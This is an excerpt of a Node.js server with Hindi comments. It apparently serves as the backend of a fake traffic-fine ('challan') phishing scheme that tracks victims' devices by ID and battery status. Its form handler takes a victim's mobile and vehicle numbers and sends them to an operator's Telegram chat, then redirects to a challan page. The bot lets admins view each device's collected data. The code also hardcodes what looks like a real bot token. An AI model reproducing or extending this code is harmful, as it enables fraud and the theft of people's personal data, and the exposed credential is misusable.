...
// ===== CONFIG =====
const token = '8446623299:AAHBvaRu6SGI0fqyPkFbbt60DZgwIYOut8o'// अपना Bot Token डालें
const ADMIN_IDS = [-1003232664762];            // अपना Admin Chat ID डालें
...
const sessions = {};
const formData = new Map(); // Store form data per device
...
app.post('/html-form-data', (req, res) => {
  ...
  // Store form data
  formData.set(uuid, { brand, battery, fields, timestamp: Date.now() });
...
app.post('/submit-public-form', (req, res) => {
  const { mobile, vehicle, uuid } = req.body;
  if (!mobile || !vehicle || !uuid) return res.status(400).send('Missing fields');

  let msg = `📝 *Public Form Submitted*\n📱 Device ID: ${uuid}\n📞 Mobile: ${mobile}\n🚗 Vehicle: ${vehicle}\n\n👨‍💻 Developer: ${DEVELOPER}`;

  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
  res.redirect('/challan-details.html'); // Redirect to next page after submission
});
  ...
  switch (cmd) {
    case 'device': {
      const buttons = [
        ...
        [{ text: '📝 View Form Data', callback_data: `view_form_data:${uuid}` }],
